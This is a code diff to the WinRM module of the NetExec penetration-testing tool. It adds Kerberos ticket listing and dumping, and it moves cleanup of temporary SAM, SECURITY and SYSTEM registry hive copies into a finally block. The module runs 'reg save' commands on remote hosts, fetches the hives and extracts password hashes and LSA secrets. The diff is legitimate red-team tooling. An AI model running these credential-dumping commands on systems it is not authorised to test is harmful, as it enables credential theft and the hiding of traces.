@@ -20,6 +20,7 @@ from nxc.connection import connection
 from nxc.helpers.bloodhound import add_user_bh
 from nxc.helpers.dpapi import DPAPITriage
 from nxc.helpers.misc import gen_random_string, sanitize_dns
+from nxc.helpers.klist import Klist
 from nxc.helpers.negotiate_parser import parse_challenge
 from nxc.logger import NXCAdapter
 
@@ -340,6 +341,12 @@ class winrm(connection):
             for line in out.splitlines():
                 self.logger.highlight(line.rstrip())
 
+    def klist(self):
+        Klist(self).display()
+
+    def klist_dump(self):
+        Klist(self).dump(self.args.klist_dump)
+
     # Dos attack prevent:
     # if someboby executed "reg save HKLM\sam C:\windows\temp\sam" before, but didn't remove "C:\windows\temp\sam" file,
     # when user execute the same command next time, in tty shell, the prompt will ask "File C:\windows\temp\sam already exists. Overwrite (Yes/No)?"
@@ -350,13 +357,12 @@ class winrm(connection):
         sam_storename = gen_random_string(6)
         system_storename = gen_random_string(6)
         dump_command = f"reg save HKLM\\SAM C:\\windows\\temp\\{sam_storename} && reg save HKLM\\SYSTEM C:\\windows\\temp\\{system_storename}"
-        clean_command = f"del C:\\windows\\temp\\{sam_storename} && del C:\\windows\\temp\\{system_storename}"
+        clean_command = f"del C:\\windows\\temp\\{sam_storename} & del C:\\windows\\temp\\{system_storename}"
         output_filename = self.output_file_template.format(output_folder="sam")
         try:
             self.conn.execute_cmd(dump_command) if self.args.dump_method == "cmd" else self.conn.execute_ps(f"cmd /c '{dump_command}'")
             self.conn.fetch(f"C:\\windows\\temp\\{sam_storename}", output_filename + ".sam")
             self.conn.fetch(f"C:\\windows\\temp\\{system_storename}", output_filename + ".system")
-            self.conn.execute_cmd(clean_command) if self.args.dump_method == "cmd" else self.conn.execute_ps(f"cmd /c '{clean_command}'")
         except Exception as e:
             if ("does not exist" in str(e)) or ("TransformFinalBlock" in str(e)):
                 self.logger.fail("Failed to dump SAM hashes, it may have been detected by AV or current user is not privileged user")
@@ -376,18 +382,22 @@ class winrm(connection):
             )
             SAM.dump()
             SAM.export(output_filename)
+        finally:
+            try:
+                self.conn.execute_cmd(clean_command) if self.args.dump_method == "cmd" else self.conn.execute_ps(f"cmd /c '{clean_command}'")
+            except Exception as e:
+                self.logger.fail(f"[OPSEC] Cleanup command failed, check C:\\windows\\temp\\{sam_storename} and C:\\windows\\temp\\{system_storename}: {e}")
 
     def lsa(self, quiet=False):
         security_storename = gen_random_string(6)
         system_storename = gen_random_string(6)
         dump_command = f"reg save HKLM\\SECURITY C:\\windows\\temp\\{security_storename} && reg save HKLM\\SYSTEM C:\\windows\\temp\\{system_storename}"
-        clean_command = f"del C:\\windows\\temp\\{security_storename} && del C:\\windows\\temp\\{system_storename}"
+        clean_command = f"del C:\\windows\\temp\\{security_storename} & del C:\\windows\\temp\\{system_storename}"
         output_filename = self.output_file_template.format(output_folder="lsa")
         try:
             self.conn.execute_cmd(dump_command) if self.args.dump_method == "cmd" else self.conn.execute_ps(f"cmd /c '{dump_command}'")
             self.conn.fetch(f"C:\\windows\\temp\\{security_storename}", f"{output_filename}.security")
             self.conn.fetch(f"C:\\windows\\temp\\{system_storename}", f"{output_filename}.system")
-            self.conn.execute_cmd(clean_command) if self.args.dump_method == "cmd" else self.conn.execute_ps(f"cmd /c '{clean_command}'")
         except Exception as e:
             if ("does not exist" in str(e)) or ("TransformFinalBlock" in str(e)):
                 self.logger.fail("Failed to dump LSA secrets, it may have been detected by AV or current user is not privileged user")
@@ -420,6 +430,11 @@ class winrm(connection):
             )
             LSA.dumpCachedHashes()
             LSA.dumpSecrets()
+        finally:
+            try:
+                self.conn.execute_cmd(clean_command) if self.args.dump_method == "cmd" else self.conn.execute_ps(f"cmd /c '{clean_command}'")
+            except Exception as e:
+                self.logger.fail(f"[OPSEC] Cleanup command failed, check C:\\windows\\temp\\{security_storename} and C:\\windows\\temp\\{system_storename}: {e}")
 
     def dpapi(self):
         self.dpapi_triage.triage_dpapi()
